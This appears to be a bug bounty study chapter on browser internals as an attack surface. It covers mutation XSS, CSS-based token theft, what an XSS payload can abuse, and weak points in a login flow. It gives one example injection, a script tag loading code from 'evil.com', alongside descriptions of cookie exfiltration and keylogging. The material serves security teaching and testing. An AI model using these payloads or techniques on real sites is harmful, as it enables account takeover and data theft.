🖥️ Chapter 3 – How Browsers Work: Exploiting the Renderer’s Weaknesses
A bug bounty hunter doesn’t just read HTML—they weaponize the browser’s own rendering pipeline. Here’s how every stage from DOM construction to JavaScript execution can be turned into an attack surface.

1. The DOM – Where Robust Parsing Creates mXSS
Browsers are forgiving of malformed HTML: they close tags, insert missing ones, and ignore garbage. This well-intentioned behavior creates mutation XSS (mXSS).

Attack vector: Inject a string that looks harmless when sanitized, but after the browser’s own DOM repair, it becomes an executable <script>.

Hunt tip: Fuzz every input that gets reflected inside HTML with dangling tags, weird attribute quotes, and mixed encodings. If the server filters <script> but the browser later restructures the DOM into something dangerous, you’ve got a bug.

2. CSS – More Than Just Pretty Rectangles
Styling information can be a delivery mechanism for attacks.

CSS injection → data exfiltration: If you can inject arbitrary CSS, you can use attribute selectors (input[value^="a"]) and background URLs to steal CSRF tokens or passwords character by character.

Selector collisions: Conflicting styles might hide warning messages or overlay phishing forms without any JavaScript.

Acid3 reference: The browser’s struggle to render complex CSS correctly is a reminder—quirks in older or less common browsers might leave a target exploitable even when modern Chrome seems safe.

3. JavaScript – Locked Down, Still Deadly
The browser sandbox severely restricts JavaScript (no file system, no OS calls, no process creation), but a successful XSS still gives an attacker everything they need.

What’s allowed vs. what you can abuse:

Sandbox permission	Attacker’s payoff
Read/manipulate current page’s DOM	Keylogging (capture input events), form hijacking, altering payment details, stealing displayed credit card data.
Make HTTP calls on behalf of the user	CSRF‑style actions from inside the victim’s origin, exfiltration of cookies/localStorage to an attacker’s server.
Open new pages or redirect (only after user action)	Phishing overlays, silent redirect chains if combined with clickjacking.
Write to browser history	History manipulation for social engineering or tracking.
Request geolocation / notifications	Spam the user with permission prompts, trick them into granting access, then exfiltrate location.
Execution timing matters:

defer attribute: Scripts without defer run as soon as the <script> tag is parsed. If you can inject a script before the DOM is fully built, you control what happens next—before any security scripts load.

Inline injection → payload loader: Even a single injected character can be turned into a full exploit by inserting <script src="//evil.com/poison.js">. Your tiny foothold loads the rest.

4. The Full Login Flow – A Map of Weak Points
The chapter walks through a user logging into Amazon. As a hunter, treat this chain as a checklist of where things go wrong:

DNS resolution: Cache poisoning or DNS rebinding may let you serve malicious content from the target’s domain.

TCP/TLS handshake: Test for weak ciphers, missing certificate pinning, or mixed content (HTTP scripts on an HTTPS page).

HTTP response (cookie set): Are cookies marked Secure, HttpOnly, SameSite? A missing flag is an invitation for hijacking.

DOM rendering: Look for DOM‑based XSS where URL fragments or document.referrer are placed unsafely into the DOM.

Subsequent requests: Does the application rely on only cookies for authentication? No additional token checks? A stolen cookie means full account takeover.

5. Browser’s Hidden Helpers – Attack the Pre‑Render Phase
Before the user sees a single pixel, the browser resolves DNS, verifies certificates, and negotiates encryption. Each of these is an independent target:

HSTS misconfiguration: If strict transport security isn’t enforced, perform a protocol downgrade attack.

Certificate errors: Users often click through warnings—social engineering to accept your self‑signed certificate gives you a perfect man‑in‑the‑middle position.

DNS prefetch / preconnect: These features can leak the user’s browsing intentions; a rogue script on a compromised page could harvest this.

